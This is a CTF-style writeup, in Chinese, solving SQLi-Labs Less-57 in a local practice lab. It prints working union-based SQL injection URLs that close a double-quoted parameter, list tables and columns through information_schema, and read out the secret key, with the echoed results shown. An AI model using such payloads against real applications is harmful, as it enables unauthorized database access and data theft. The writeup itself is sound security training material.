【SQLi-Labs】Less-57 Challenge-4 双引号型联合查询 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 联合查询, Challenge

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入 Challenge 系列
  • 题目名称：Less-57 (Challenge-4)
  • 提示：目标是从 challenges 库中提取密钥，限制 14 次尝试。

2. 核心原理与前置分析

本关卡延续了 Challenge 系列的机制，需要利用 information_schema 获取随机生成的表名与列名。

核心区别：此关卡上下文由双引号包裹 id="$id"。在构造 Payload 时，必须使用双引号 " 来闭合原查询。

3. 操作步骤与解析

第一步：获取随机表名与列名（消耗 1 次尝试）

输入 URL：?id=-1" union select 1, group_concat(table_name,0x3a,column_name), 3 from information_schema.columns where table_schema='challenges' --+

回显现象：页面第 2 列回显 0jrjidx8z5:id, 0jrjidx8z5:sessid, 0jrjidx8z5:secret_LDDT, 0jrjidx8z5:tryy。

解释与原理：使用双引号闭合后，通过系统表一次性提取当前 challenges 库的所有表名与列名。

第二步：提取 24 位密钥（消耗 1 次尝试）

输入 URL：?id=-1" union select 1, secret_LDDT, 3 from challenges.0jrjidx8z5 --+

回显现象：Your Login name:um7KLqrCkbMG1mi2mOdSaldO。

解释与原理：利用获取到的随机表名（0jrjidx8z5）和列名（secret_LDDT），直接查询目标密钥数据。

第三步：提交通关

将获取到的密钥粘贴至页面底部的 Submit Secret Key 输入框，点击 Submit 即可。

4. 策略复盘

  • 随机字符的准确识别：Challenge 系列的表名包含大量易混淆字符（如 0 和 O、1 和 l、x 和 d）。在复制 Payload 时，必须严格核对截图或回显中的字母。
  • 容错机制：14 次的尝试上限给予了足够的试错空间。若因拼写错误导致查询失败，无需纠结，直接点击 Reset the Challenge! 重新生成表名继续即可。

5. 知识点总结

  • 双引号闭合注入：在 PHP 源码使用双引号包裹 SQL 变量时，必须使用双引号进行上下文逃逸。
